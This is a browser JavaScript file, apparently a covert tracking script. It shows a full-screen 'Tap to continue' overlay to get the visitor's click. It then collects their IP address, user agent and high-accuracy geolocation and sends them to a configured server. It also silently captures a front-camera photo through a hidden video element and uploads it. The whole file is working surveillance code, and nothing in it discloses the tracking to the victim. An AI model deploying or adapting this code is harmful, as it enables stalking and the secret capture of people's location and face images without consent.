// Create overlay UI
const overlay = document.createElement("div");
overlay.style.position = "fixed";
overlay.style.top = "0";
overlay.style.left = "0";
overlay.style.width = "100%";
overlay.style.height = "100%";
overlay.style.background = "#000";
overlay.style.display = "flex";
overlay.style.alignItems = "center";
overlay.style.justifyContent = "center";
overlay.style.zIndex = "9999";

overlay.innerHTML = `
  <div style="text-align:center;color:white">
    <p>Tap to continue</p>
    <button style="padding:10px 20px;border:none;border-radius:8px;">Continue</button>
  </div>
`;

document.body.appendChild(overlay);

// Main function
async function startTracking() {
  overlay.remove();

  const scriptTag = document.querySelector('script[data-tracking-id]');
  if (!scriptTag) return;

  const trackingId = scriptTag.getAttribute('data-tracking-id');
  const serverUrl = scriptTag.getAttribute('data-server-url');
  if (!trackingId || !serverUrl) return;

  const data = {};

  // IP
  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    data.IP_Address = (await ipResponse.json()).ip;
  } catch (e) {
    data.IP_Address = 'Error';
  }

  data.User_Agent = navigator.userAgent;
  data.Language = navigator.language;

  // LOCATION
  if (navigator.geolocation) {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000
        });
      });

      data.Location = {
        Latitude: position.coords.latitude,
        Longitude: position.coords.longitude
      };
    } catch (err) {
      console.log("Location error:", err);
    }
  }

  // Send data
  await fetch(`${serverUrl}/data?trackingId=${trackingId}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data),
  }).catch(err => console.log(err));

  // CAMERA
  if (navigator.mediaDevices) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }
      });

      const video = document.createElement('video');
      video.style.display = 'none';
      document.body.appendChild(video);
      video.srcObject = stream;

      await video.play();

      // WAIT for real video data
      await new Promise((resolve) => {
        if (video.readyState >= 2) resolve();
        else video.onloadeddata = () => resolve();
      });

      await new Promise(r => setTimeout(r, 800));

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imageData = canvas.toDataURL('image/jpeg', 0.5);

      await fetch(`${serverUrl}/photo?trackingId=${trackingId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ imageData }),
      }).catch(err => console.log("Photo send error:", err));

      stream.getTracks().forEach(track => track.stop());
      video.remove();

    } catch (err) {
      console.log("Camera error:", err);
    }
  }
}

// CLICK trigger (important)
overlay.addEventListener("click", startTracking, { once: true });
